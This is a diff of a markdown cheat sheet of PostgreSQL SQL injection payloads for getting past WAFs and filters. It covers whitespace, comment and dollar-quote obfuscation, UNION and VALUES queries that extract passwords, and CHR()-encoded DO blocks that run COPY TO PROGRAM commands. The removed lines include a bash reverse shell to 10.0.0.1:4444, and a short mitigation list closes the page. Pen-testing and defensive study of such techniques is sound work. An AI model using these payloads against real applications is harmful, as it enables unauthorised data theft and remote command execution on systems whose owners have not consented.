@@ -4,12 +4,14 @@ description: Techniques for bypassing WAFs and filters in PostgreSQL injection
 category: Advanced Techniques
 order: 20
 tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
-lastUpdated: 2025-12-14
+lastUpdated: 2025-12-15
 ---
 
 ## Fuzzing and Obfuscation
 
 Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.
+
+All techniques tested on PostgreSQL 12.x and 16.x unless noted otherwise.
 
 ### Comment Variations
 
@@ -22,338 +24,259 @@ SELECT * FROM users -- comment
 -- C-style block comment
 SELECT * FROM users /* comment */
 
--- Inline comments for obfuscation
-SELECT/*comment*/username/**/FROM/**/users
+-- Inline comments for obfuscation (replace spaces)
+SELECT/**/username/**/FROM/**/users
 
--- Nested comments (PostgreSQL allows this)
+-- Nested comments (PostgreSQL-specific)
 SELECT /* outer /* nested */ comment */ username FROM users
+```
+
+**Note:** Unlike MySQL, PostgreSQL does **NOT** support splitting keywords with comments:
+
+```sql
+-- DOES NOT WORK in PostgreSQL
+SEL/**/ECT username FR/**/OM users  -- Syntax error!
+```
+
+### Whitespace Alternatives
+
+PostgreSQL accepts only **5 characters** as whitespace (tested across Unicode range 0x0000-0xFFFF):
+
+| Hex  | Dec | Character       | URL Encoded |
+| ---- | --- | --------------- | ----------- |
+| 0x09 | 9   | Horizontal Tab  | %09         |
+| 0x0A | 10  | Line Feed (LF)  | %0A         |
+| 0x0C | 12  | Form Feed       | %0C         |
+| 0x0D | 13  | Carriage Return | %0D         |
+| 0x20 | 32  | Space           | %20         |
+
+```sql
+-- Tab and newline as separators
+SELECT%09username%0AFROM%0Dusers
+
+-- Between UNION and SELECT
+0 UNION%09SELECT 1,2,3,4--
+0 UNION%0ASELECT 1,2,3,4--
+```
+
+### Characters That Don't Require Space After SELECT
+
+Certain characters can immediately follow `SELECT` without whitespace:
+
+| Works | Pattern     | Example        | Why                         |
+| ----- | ----------- | -------------- | --------------------------- |
+| ✓     | `'` (quote) | `SELECT'test'` | Quote starts string literal |
+| ✓     | `.` (dot)   | `SELECT.1e1`   | Dot starts decimal number   |
+| ✓     | `-` (minus) | `SELECT-1`     | Unary minus operator        |
+| ✓     | `+` (plus)  | `SELECT+1`     | Unary plus operator         |
+| ✓     | `@` (at)    | `SELECT@(-5)`  | Absolute value operator     |
+| ✓     | `(` (paren) | `SELECT(1)`    | Parentheses grouping        |
+
+```sql
+-- No space needed after SELECT
+SELECT'test'
+SELECT.1e1
+SELECT-1
+SELECT+1
+SELECT(username)FROM users
+
+-- Combined with UNION
+0 UNION(SELECT'test','x','x','x')--
+0 UNION(SELECT+1,'test','x','x')--
+```
+
+### Parentheses as Space Alternative
+
+Parentheses eliminate the need for whitespace in many contexts:
+
+```sql
+-- No spaces needed
+UNION(SELECT 1,2,3,4)
+UNION((SELECT 1,2,3,4))
+UNION ALL(SELECT 1,2,3,4)
+SELECT(username)FROM(users)WHERE(id=1)
+
+-- Nested subquery hides UNION SELECT pattern
+0 UNION(SELECT * FROM(SELECT 1,$$test$$,$$x$$,$$x$$)t)--
+```
+
+### VALUES Clause (Avoids SELECT Keyword!)
+
+The `VALUES` clause completely bypasses `UNION SELECT` pattern matching:
+
+```sql
+-- Basic VALUES (no SELECT keyword after UNION!)
+0 UNION VALUES(1,$$test$$,$$email$$,$$role$$)--
+
+-- VALUES with multiple rows
+0 UNION VALUES(1,$$a$$,$$b$$,$$c$$),(2,$$d$$,$$e$$,$$f$$)--
+
+-- VALUES with alternative whitespace
+0 UNION%09VALUES(1,$$test$$,$$x$$,$$x$$)--
+
+-- VALUES with subqueries (extract real data!)
+0 UNION VALUES(999,(SELECT password FROM users LIMIT 1),$$x$$,$$x$$)--
+0 UNION VALUES((SELECT id FROM users LIMIT 1),(SELECT username FROM users LIMIT 1),$$x$$,$$x$$)--
 ```
 
 ### Dollar Quote Obfuscation
 
-PostgreSQL's dollar quoting is powerful for bypassing quote filters:
+PostgreSQL's dollar quoting bypasses single quote filters:
 
 ```sql
--- Avoid single quotes entirely
+-- Basic dollar quotes
 SELECT * FROM users WHERE username = $$admin$$
 
 -- Tagged dollar quotes
 SELECT * FROM users WHERE username = $x$admin$x$
 
--- Different tags for nesting
-SELECT $outer$String with $$inner$$ quotes$outer$
+-- Unicode tags (WAFs often don't expect these)
+SELECT * FROM users WHERE username = $α$admin$α$
+SELECT * FROM users WHERE username = $日$admin$日$
+SELECT * FROM users WHERE username = $💀$admin$💀$  -- PG12+
 
--- In injection context
-' OR username = $$admin$$ --
+-- UNION with unicode tags
+0 UNION SELECT 1,$α$test$α$,$β$email$β$,$γ$role$γ$--
 ```
 
-### Whitespace Manipulation
+**Tag Rules:**
 
-PostgreSQL accepts various whitespace characters:
-
-```sql
--- Using tabs and newlines
-SELECT
-    username
-FROM
-    users
-
--- Using form feed and vertical tab (may work in some contexts)
-SELECT%0Ausername%0AFROM%0Ausers
-
--- Excessive whitespace
-SELECT       username       FROM       users
-```
-
-### Case Variation
-
-SQL keywords in PostgreSQL are case-insensitive:
-
-```sql
-select USERNAME from USERS where ID=1
-SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
-SELECT username FROM users WHERE id=1
-```
+- Tags can contain letters (including Unicode), digits, and underscores
+- Tags **cannot** start with a digit (`$1$` fails)
+- Tags are case-sensitive (`$Tag$` ≠ `$tag$`)
 
 ### String Representation Alternatives
 
-Multiple ways to represent strings:
+Multiple ways to represent strings without standard quotes:
 
 ```sql
--- Standard single quotes
-SELECT 'admin'
-
--- Dollar quotes
-SELECT $$admin$$
-
--- CHR() function (avoid quotes entirely)
+-- CHR() function (builds string from ASCII codes)
 SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- 'admin'
+1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--
 
 -- Escape string syntax
-SELECT E'\x61\x64\x6d\x69\x6e'  -- 'admin' in hex
+SELECT E'\x61\x64\x6d\x69\x6e'  -- Hex
+SELECT E'\141\144\155\151\156'  -- Octal
 
 -- Unicode escape
-SELECT U&'\0061\0064\006D\0069\006E'  -- 'admin'
+SELECT U&'\0061\0064\006D\0069\006E'
 
--- convert_from with bytea
-SELECT convert_from('\x61646d696e', 'UTF8')  -- 'admin'
+-- Custom UESCAPE (bypasses backslash filters)
+SELECT U&'!0061dmin' UESCAPE '!'
+
+-- Convert from hex
+SELECT convert_from('\x61646d696e', 'UTF8')
 ```
 
 ### Numeric Representation
 
-Numbers can be represented various ways:
+Bypass filters that match specific integers:
 
 ```sql
--- Standard
-SELECT * FROM users WHERE id = 1
+-- Scientific notation
+?id=1e0
+?id=0.1e1
 
 -- Mathematical expressions
-SELECT * FROM users WHERE id = 2-1
-SELECT * FROM users WHERE id = 0+1
+?id=2-1
+?id=ABS(-1)
+?id=LENGTH('x')
+?id=ASCII('1')-48
 
 -- Boolean conversion
-SELECT * FROM users WHERE id = true::int  -- true = 1
+?id=true::int
 
 -- Cast from string
-SELECT * FROM users WHERE id = '1'::int
+?id='1'::int
 
--- Hexadecimal in numeric context
-SELECT * FROM users WHERE id = x'1'::int
+-- For UNION injections
+0e0 UNION SELECT 1,2,3,4--
 ```
 
 ### Type Casting for Bypass
 
-PostgreSQL's `::` operator can help bypass filters:
-
 ```sql
--- Cast to avoid pattern matching
-SELECT * FROM users WHERE id = '1'::integer
+-- Multiple type name variations
+?id='1'::int
+?id='1'::integer
+?id='1'::int4
+?id=CAST('1' AS int)
+
+-- Type constructor functions
+?id=int4('1')
 
 -- Array syntax
-SELECT * FROM users WHERE id = ANY(ARRAY[1])
-
--- Using CAST function instead of ::
-SELECT * FROM users WHERE id = CAST('1' AS int)
+?id=ANY(ARRAY[1])
+?id=ANY('{1}'::int[])
 ```
 
-### Function Call Variations
+### Boolean Representation Bypasses
+
+Many representations of TRUE/FALSE for bypassing `1=1` filters:
 
 ```sql
--- Standard function call
-SELECT SUBSTRING('admin', 1, 3)
-
--- Using FROM/FOR syntax
-SELECT SUBSTRING('admin' FROM 1 FOR 3)
-
--- Alternative function names
-SELECT SUBSTR('admin', 1, 3)
-SELECT LEFT('admin', 3)
-```
-
-### UNION Query Obfuscation
-
-```sql
--- Standard UNION
-SELECT * FROM users UNION SELECT 1,2,3
-
--- UNION ALL (avoids DISTINCT processing)
-SELECT * FROM users UNION ALL SELECT 1,2,3
-
--- Adding redundant conditions
-SELECT * FROM users WHERE 1=1 UNION SELECT 1,2,3 WHERE 1=1
-
--- Nested queries
-SELECT * FROM (SELECT * FROM users UNION SELECT 1,2,3) AS t
-```
-
-### Keyword Splitting with Comments (Limited in PostgreSQL)
-
-**Important**: Unlike MySQL, PostgreSQL does **NOT** support splitting keywords with inline comments. The following MySQL techniques will **NOT** work in PostgreSQL:
-
-```sql
--- DOES NOT WORK in PostgreSQL (works in MySQL)
-SEL/**/ECT username FR/**/OM users  -- Syntax error!
-UN/**/ION SEL/**/ECT 1,2,3          -- Syntax error!
-VERS/**/ION()                        -- Syntax error!
-```
-
-However, comments **between** complete keywords still work:
-
-```sql
--- Comments between keywords (works in PostgreSQL)
-SELECT /**/ username /**/ FROM /**/ users WHERE id = 1
-SELECT /* comment */ * FROM /* another */ users
-
--- Inline comments for spacing
-SELECT/**/username/**/FROM/**/users WHERE id = 1
-```
-
-### Alternative SQL Constructs
-
-```sql
--- Instead of UNION SELECT
-SELECT username FROM users WHERE id=1 OR 1=1
-SELECT * FROM users LIMIT 1 OFFSET 0
-
 -- Instead of OR 1=1
-OR true
-OR NOT false
-OR 1
-OR ''=''
+1 OR true--
+1 OR 'yes'::boolean--
+1 OR 'on'::boolean--
+1 OR 1::boolean--
+1 OR NOT false--
+1 OR BOOL 't'--
 
--- Instead of AND 1=1
-AND true
-AND NOT false
-AND 1::boolean
+-- TRUE representations
+true, 't'::boolean, 'yes'::boolean, 'on'::boolean, 1::boolean
+
+-- FALSE representations
+false, 'f'::boolean, 'no'::boolean, 'off'::boolean, 0::boolean
 ```
 
-### Encoding Techniques
-
-```sql
--- URL encoding (handled by web server)
-%27%20OR%20%271%27%3D%271
-
--- Double URL encoding
-%2527%2520OR%2520%25271%2527%253D%25271
-
--- Unicode encoding in strings
-U&'\0027 OR \00271\0027=\00271'
-```
-
-### Using Subqueries
-
-```sql
--- Hide data extraction in subquery
-SELECT * FROM users WHERE id = (SELECT 1)
-
--- Using WITH clause (CTE)
-WITH t AS (SELECT 1 AS id) SELECT * FROM users, t WHERE users.id = t.id
-
--- Correlated subquery
-SELECT * FROM users u WHERE EXISTS (SELECT 1 WHERE u.id = 1)
-```
-
-### PostgreSQL-Specific Bypasses
+### PostgreSQL-Specific Operators
 
 #### Array Operators
 
 ```sql
--- Using array contains
 SELECT * FROM users WHERE ARRAY[id] @> ARRAY[1]
-
--- Using ANY
 SELECT * FROM users WHERE id = ANY('{1,2,3}'::int[])
-
--- Using array comparison
 SELECT * FROM users WHERE id = (ARRAY[1,2,3])[1]
 ```
 
-#### Regular Expression Operators
+#### Pattern Matching Alternatives
 
 ```sql
 -- Instead of LIKE
-SELECT * FROM users WHERE username ~ '^admin'
-
--- Case insensitive
-SELECT * FROM users WHERE username ~* 'ADMIN'
-
--- SIMILAR TO
-SELECT * FROM users WHERE username SIMILAR TO 'a%'
+1 OR username ~ $$^admin$$--           -- regex
+1 OR username ~* $$^ADMIN$$--          -- regex case-insensitive
+1 OR username ^@ $$adm$$--             -- starts-with (PG11+)
+1 OR STRPOS(username, $$admin$$) > 0--
 ```
 
-#### JSON Operators (if applicable)
+#### Schema-Qualified Functions
+
+Prefix with `pg_catalog.` to bypass function name filters:
 
 ```sql
--- Using JSON functions to construct values
-SELECT * FROM users WHERE username = ('{"name":"admin"}'::json->>'name')
-```
-
-### Practical Bypass Examples
-
-#### Bypassing Quote Filters
-
-```sql
--- If single quotes are blocked
-' OR username = $$admin$$ --
-' OR username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) --
-' OR username = (SELECT chr(97)||chr(100)||chr(109)||chr(105)||chr(110)) --
-```
-
-#### Bypassing Keyword Filters
-
-```sql
--- If 'SELECT' is blocked
-' UNION (TABLE users) --  -- PostgreSQL allows TABLE as shorthand
-
--- If 'UNION' is blocked (use stacked queries if supported)
-'; SELECT * FROM users --
-
--- Break keywords with comments
-' UN/**/ION SEL/**/ECT username, password FR/**/OM users --
-```
-
-#### Bypassing Space Filters
-
-```sql
--- Use comments instead of spaces
-'/**/OR/**/1=1--
-
--- Use parentheses
-'OR(1=1)--
-
--- Use line comments
-'OR--comment%0A1=1--
+1 OR pg_catalog.length(username) > 0--
+1 OR pg_catalog.upper(username) = $$ADMIN$$--
 ```
 
 ### DO $$ Block WAF Bypass
 
-The `DO` command executes anonymous PL/pgSQL code blocks. Combined with `CHR()` encoding, this can bypass many WAF signatures that look for specific SQL keywords.
-
-**Basic DO Block:**
+Execute dynamic SQL with CHR() encoding to bypass keyword filters:
 
 ```sql
--- Execute arbitrary PL/pgSQL
+-- Basic DO block
 DO $$ BEGIN RAISE NOTICE 'Hello'; END $$;
 
--- With variable declaration
+-- Build commands with CHR()
 DO $$
-DECLARE
-    result TEXT;
+DECLARE cmd TEXT;
 BEGIN
-    SELECT username INTO result FROM users LIMIT 1;
-    RAISE NOTICE 'User: %', result;
-END $$;
-```
-
-**Building Commands with CHR() to Bypass WAF:**
-
-```sql
--- Build 'COPY' command character by character
-DO $$
-DECLARE
-    cmd TEXT;
-BEGIN
-    -- CHR(67)='C', CHR(79)='O', CHR(80)='P', CHR(89)='Y'
-    cmd := CHR(67) || CHR(79) || CHR(80) || CHR(89);
-    cmd := cmd || ' (SELECT '''') TO PROGRAM ''id''';
+    cmd := CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84);  -- SELECT
+    cmd := cmd || ' * FROM users';
     EXECUTE cmd;
 END $$;
 
--- Full reverse shell bypass
-DO $$
-DECLARE
-    cmd TEXT;
-BEGIN
-    cmd := CHR(67)||CHR(79)||CHR(80)||CHR(89);  -- COPY
-    cmd := cmd || ' (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"''';
-    EXECUTE cmd;
-END $$;
-```
-
-**Encoded COPY TO PROGRAM:**
-
-```sql
--- Bypass 'COPY' keyword filter
+-- Bypass COPY keyword filter
 DO $x$
 DECLARE
     c TEXT := CHR(67)||CHR(79)||CHR(80)||CHR(89);  -- COPY
@@ -363,47 +286,37 @@ BEGIN
 END $x$;
 ```
 
-**Dynamic Table Creation:**
+**Helper to convert string to CHR():**
 
 ```sql
--- Build table name dynamically
-DO $$
-DECLARE
-    tbl TEXT;
-BEGIN
-    tbl := CHR(99)||CHR(109)||CHR(100);  -- 'cmd'
-    EXECUTE 'CREATE TABLE ' || tbl || ' (output TEXT)';
-    EXECUTE 'COPY ' || tbl || ' FROM PROGRAM ''id''';
-END $$;
-```
-
-**Using EXECUTE for Any Statement:**
-
-```sql
--- Execute any SQL dynamically
-DO $$
-BEGIN
-    -- SELECT bypass
-    EXECUTE CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||' * FROM users';
-
-    -- DROP bypass (dangerous!)
-    -- EXECUTE CHR(68)||CHR(82)||CHR(79)||CHR(80)||' TABLE logs';
-END $$;
-```
-
-**Helper Function to Convert String to CHR:**
-
-```sql
--- In your attack preparation (not during injection)
--- Convert any string to CHR() calls
 SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
-FROM regexp_split_to_table('COPY', '') AS ch;
--- Returns: CHR(67)||CHR(79)||CHR(80)||CHR(89)
+FROM regexp_split_to_table('SELECT', '') AS ch;
+-- Returns: CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)
+```
+
+### Complete Bypass Examples
+
+```sql
+-- No space after UNION, no SELECT keyword
+0 UNION%09VALUES(999,(SELECT password FROM users LIMIT 1),$$x$$,$$x$$)--
+
+-- Parentheses eliminate all spaces
+0 UNION(SELECT(username)FROM(users))--
+
+-- Unicode tags + block comments
+0/**/UNION/**/SELECT/**/1,$α$test$α$,$β$email$β$,$γ$role$γ$--
+
+-- Maximum obfuscation
+0%09UNION%09VALUES(999,(SELECT%09password%09FROM%09users%09LIMIT%091),$α$x$α$,$β$x$β$)--
+
+-- Scientific notation + boolean
+1e0 OR 'yes'::boolean--
+
+-- CHR() encoded comparison
+1 OR username=(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))--
 ```
 
 ### Automated Testing
-
-Test obfuscation with tools:
 
 ```bash
 # SQLMap with tamper scripts
@@ -418,11 +331,8 @@ sqlmap -u "http://target/page?id=1" --tamper=space2comment,charencode
 
 ### Mitigation
 
-To protect against obfuscation techniques:
-
 1. Use parameterized queries (prepared statements)
 2. Implement input validation with whitelist approach
 3. Use WAF with regularly updated signatures
 4. Limit database user privileges
 5. Monitor and log suspicious query patterns
-6. Use security testing tools to validate protections
